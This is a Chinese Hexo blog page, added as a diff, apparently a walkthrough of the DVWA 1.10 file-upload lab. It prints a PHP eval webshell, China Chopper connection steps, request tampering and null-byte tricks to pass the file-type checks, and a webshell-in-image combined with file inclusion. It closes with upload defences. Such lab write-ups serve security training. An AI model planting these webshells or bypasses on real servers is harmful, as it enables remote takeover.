@@ -1,0 +1,1515 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-bounce.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon32x32.ico?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16x16.ico?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="keywords" content="DVWA1.10">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA1.10之文件上传">
+<meta property="og:url" content="http://yoursite.com/2019/05/27/DVWA1-10之文件上传/index.html">
+<meta property="og:site_name" content="LoongEyes">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/file%20upload/1.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/file%20upload/2.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/file%20upload/3.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/file%20upload/4.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/file%20upload/5.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/file%20upload/8.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/file%20upload/9.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/file%20upload/10.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/file%20upload/11.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/file%20upload/12.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/file%20upload/13.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/file%20upload/14.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/file%20upload/15.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/file%20upload/17.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/file%20upload/18.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/file%20upload/19.png">
+<meta property="og:updated_time" content="2020-02-24T04:17:16.572Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DVWA1.10之文件上传">
+<meta name="twitter:image" content="http://yoursite.com/images/baji/dvwa/file%20upload/1.png">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/05/27/DVWA1-10之文件上传/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>DVWA1.10之文件上传 | LoongEyes</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">LoongEyes</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />关于</a>
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/27/DVWA1-10之文件上传/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="LoongEyes">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LoongEyes">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">DVWA1.10之文件上传
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-05-27 23:01:00" itemprop="dateCreated datePublished" datetime="2019-05-27T23:01:00+08:00">2019-05-27</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2020-02-24 12:17:16" itemprop="dateModified" datetime="2020-02-24T12:17:16+08:00">2020-02-24</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/靶机/" itemprop="url" rel="index"><span itemprop="name">靶机</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <hr>
+<a id="more"></a>
+<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的<code>webshell</code>权限，因此文件上传漏洞带来的危害常常是毁灭性的，<code>Apache</code>、<code>Tomcat</code>、<code>Nginx</code>等都曝出过文件上传漏洞</p>
+<p>文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知</p>
+<hr>
+<h1 id="LOW级别漏洞利用"><a href="#LOW级别漏洞利用" class="headerlink" title="LOW级别漏洞利用"></a>LOW级别漏洞利用</h1><ol>
+<li><p>编辑一句话木马<code>1.php</code></p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> @eval($_POST[&apos;cmd&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol start="2">
+<li><p>上传</p>
+<p> <img src="/images/baji/dvwa/file upload/1.png" alt="1.png"></p>
+</li>
+<li><p>中国菜刀链接<code>webshell</code></p>
+<p> 指定连接目录为<code>http://172.16.12.89/hackable/uploads/1.php</code>，参数为<code>cmd</code>，类型为<code>PHP(eval)</code></p>
+<p> <img src="/images/baji/dvwa/file upload/2.png" alt="2.png"></p>
+</li>
+<li><p>双击新添加的条目</p>
+<p> <img src="/images/baji/dvwa/file upload/3.png" alt="3.png"></p>
+</li>
+<li><p>获取目标站点目录访问权限</p>
+<p> <img src="/images/baji/dvwa/file upload/4.png" alt="4.png"></p>
+</li>
+<li><p>模拟终端</p>
+<p> <img src="/images/baji/dvwa/file upload/5.png" alt="5.png"></p>
+</li>
+</ol>
+<hr>
+<h1 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h1><p><code>Medium</code>级别的代码对上传文件的类型、大小做了限制，要求文件类型(<code>Content-Type</code>)必须是<code>jpeg</code>或者<code>png</code>，大小不能超过<code>100000B</code>（约为<code>97.6KB</code>）</p>
+<!--
+
+## 组合攻击(文件包含+文件上传)
+
+1. 上传一句话木马`a.png`
+
+    一句话木马不受大小限制影响
+
+    ![6.png](/images/baji/dvwa/file upload/6.png)
+
+2. 使用中国菜刀连接`webshell`
+
+    ![7.png](/images/baji/dvwa/file upload/7.png)
+
+    无法成功获取`webshell`权限
+
+    中国菜刀的原理是向上传文件发送包含`cmd`参数的post请求，通过控制`cmd`参数来执行不同的命令，而这里服务器将木马文件解析成了图片文件，因此向其发送`post`请求时，服务器只会返回这个“图片”文件，并不会执行相应命令
+
+3. 利用`Medium`级别文件包含漏洞获取`webshell`权限
+
+    服务器包含文件时，不管文件后缀是否是`php`，都会尝试当做`php`文件执行，如果文件内容确为`php`，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容
+
+    中国菜刀连接`http://172.16.12.89/vulnerabilities/fi/?page=hthttp://tp://172.16.12.89/hackable/uploads/a.png`
+
+    参数名为`cmd`，脚本语言选择`php(eval)`
+
+-->
+<h2 id="抓包修改文件类型"><a href="#抓包修改文件类型" class="headerlink" title="抓包修改文件类型"></a>抓包修改文件类型</h2><p>一句话木马不受大小限制影响</p>
+<ol>
+<li><p>将<code>1.php</code>更名为<code>a.png</code></p>
+</li>
+<li><p>上传<code>a.png</code>，抓包</p>
+<p> <img src="/images/baji/dvwa/file upload/8.png" alt="8.png"></p>
+</li>
+<li><p>修改上传文件后缀名</p>
+<p> <img src="/images/baji/dvwa/file upload/9.png" alt="9.png"></p>
+</li>
+<li><p>上传成功</p>
+<p> <img src="/images/baji/dvwa/file upload/10.png" alt="10.png"></p>
+</li>
+<li><p>中国菜刀连接</p>
+<p> 指定连接目录为<code>http://172.16.12.89/hackable/uploads/a.php</code>，参数为<code>cmd</code>，类型为<code>PHP(eval)</code></p>
+<p> <img src="/images/baji/dvwa/file upload/11.png" alt="11.png"></p>
+</li>
+</ol>
+<!--
+
+## 截断绕过规则
+
+在`php`版本小于5.3.4的服务器中，当`Magic_quote_gpc`选项为`off`时，可以在文件名中使用`%00`截断，所以可以把上传文件命名为`a.php%00.png`
+
+可以通过文件类型检查
+
+1. 上传`a.php`
+
+    修改`Content-Type`为`image/png`
+
+    修改`a.php`为`a.php%00.png`
+
+2. 上传成功
+
+    ![16.png](/images/baji/dvwa/file upload/16.png)
+
+3. 中国菜刀连接
+
+-->
+<hr>
+<h1 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h1><p><code>High</code>级别的代码读取文件名中最后一个<code>.</code>后的字符串(文件后缀名)，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是<code>*.jpg</code>、<code>*.jpeg</code> 、<code>*.png</code>之一。同时，<code>getimagesize</code>函数更是限制了上传文件的文件头必须为图像类型</p>
+<h2 id="什么是文件头"><a href="#什么是文件头" class="headerlink" title="什么是文件头"></a>什么是文件头</h2><p>文件头是位于文件开头的一段承担一定任务的数据，一般都在开头的部分</p>
+<p>文件头就是为了描述一个文件的一些重要的属性,文件头告诉了打开并处理该文件的程序这些属性</p>
+<p>常见文件的文件头(16进制)：</p>
+<ol>
+<li><p><code>JPEG (jpg)</code>，文件头：<code>FFD8FF</code></p>
+</li>
+<li><p><code>PNG (png)</code>，文件头：<code>89504E47</code></p>
+</li>
+<li><p><code>GIF (gif)</code>，文件头：<code>47494638</code></p>
+</li>
+<li><p><code>HTML (html)</code>，文件头：<code>68746D6C3E</code></p>
+</li>
+<li><p><code>MS Word/Excel (xls.or.doc)</code>，文件头：<code>D0CF11E0</code></p>
+</li>
+<li><p><code>Quicken (qdf)</code>，文件头：<code>AC9EBD8F</code></p>
+</li>
+<li><p><code>ZIP Archive (zip)</code>，文件头：<code>504B0304</code></p>
+</li>
+<li><p><code>RAR Archive (rar)</code>，文件头：<code>52617221</code></p>
+</li>
+<li><p>可执行文件（<code>EXE</code>），文件头：<code>MZ</code></p>
+</li>
+</ol>
+<!--
+
+## 截断绕过规则
+
+采用`%00`截断的方法可以轻松绕过文件名的检查，但是需要将上传文件的文件头伪装成图片
+
+-->
+<h2 id="将木马隐藏在图片中绕过-文件上传-文件包含"><a href="#将木马隐藏在图片中绕过-文件上传-文件包含" class="headerlink" title="将木马隐藏在图片中绕过(文件上传+文件包含)"></a>将木马隐藏在图片中绕过(文件上传+文件包含)</h2><ol>
+<li><p>使用<code>copy</code>将木马文件<code>a.php</code>与图片文件<code>1.jpg</code>合并</p>
+<p> <img src="/images/baji/dvwa/file upload/12.png" alt="12.png"></p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b+a.php/a a.jpg</span><br></pre></td></tr></table></figure>
+<p><img src="/images/baji/dvwa/file upload/13.png" alt="13.png"></p>
+<p>可以看到，一句话木马被添加到图片的尾部</p>
+<p><img src="/images/baji/dvwa/file upload/14.png" alt="14.png"></p>
+</li>
+<li><p>上传成功</p>
+<p> <img src="/images/baji/dvwa/file upload/15.png" alt="15.png"></p>
+</li>
+<li><p>利用<code>high</code>级别文件包含漏洞读取图片马</p>
+<p> <img src="/images/baji/dvwa/file upload/17.png" alt="17.png"></p>
+</li>
+<li><p>中国菜刀连接</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.12.83/vulnerabilities/fi/?page=file:///opt/lampp/htdocs/DVWA-master/hackable/uploads/a.jpg</span><br></pre></td></tr></table></figure>
+<p>注意，应设置请求头中包含<code>cookie</code>值</p>
+<p><img src="/images/baji/dvwa/file upload/18.png" alt="18.png"></p>
+</li>
+<li><p>连接成功</p>
+<p> <img src="/images/baji/dvwa/file upload/19.png" alt="19.png"></p>
+</li>
+</ol>
+<hr>
+<h1 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h1><p><code>Impossible</code>级别的代码对上传文件进行了重命名（改为<code>md5</code>值），加入<code>Anti-CSRF token</code>防护<code>CSRF</code>攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件</p>
+<hr>
+<h1 id="文件上传防御"><a href="#文件上传防御" class="headerlink" title="文件上传防御"></a>文件上传防御</h1><ol>
+<li><p>文件扩展名在服务器端使用白名单进行校验</p>
+</li>
+<li><p>文件内容在服务器端进行校验</p>
+</li>
+<li><p>对文件进行上传重命名</p>
+</li>
+<li><p>隐藏文件上传路径</p>
+</li>
+<li><p>文件上传目录权限为任何人不可执行</p>
+</li>
+</ol>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/DVWA1-10/" <i class="fa fa-tag"></i> DVWA1.10</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/23/DVWA1-10之不安全的验证码/" rel="next" title="DVWA1.10之不安全的验证码">
+                <i class="fa fa-chevron-left"></i> DVWA1.10之不安全的验证码
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/06/17/Linux桌面美化/" rel="prev" title="Linux桌面美化">
+                Linux桌面美化 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  
+  <div>
+	
+		<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">---------------The  End---------------</div>
+    
+</div>
+	
+  </div>
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">LoongEyes</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">81</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#文件上传漏洞"><span class="nav-number">1.</span> <span class="nav-text">文件上传漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LOW级别漏洞利用"><span class="nav-number">2.</span> <span class="nav-text">LOW级别漏洞利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Medium级别"><span class="nav-number">3.</span> <span class="nav-text">Medium级别</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#抓包修改文件类型"><span class="nav-number">3.1.</span> <span class="nav-text">抓包修改文件类型</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#High级别"><span class="nav-number">4.</span> <span class="nav-text">High级别</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是文件头"><span class="nav-number">4.1.</span> <span class="nav-text">什么是文件头</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#将木马隐藏在图片中绕过-文件上传-文件包含"><span class="nav-number">4.2.</span> <span class="nav-text">将木马隐藏在图片中绕过(文件上传+文件包含)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Impossible级别"><span class="nav-number">5.</span> <span class="nav-text">Impossible级别</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件上传防御"><span class="nav-number">6.</span> <span class="nav-text">文件上传防御</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">LoongEyes</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共160.9k字</span>
+</div>
+
+
+<div style="width:400px;margin:0 auto; padding:20px 0;">
+	<div style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><img src="/images/beiantubiao.png" alt="备案标识"/></div>
+	<a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=37010302000766" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><img src="" style="float:left;"/><p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;">鲁公网安备 37010302000766号</p></a>
+	<div style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;">鲁ICP备19025353号</p></div>
+</div>
+ 
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
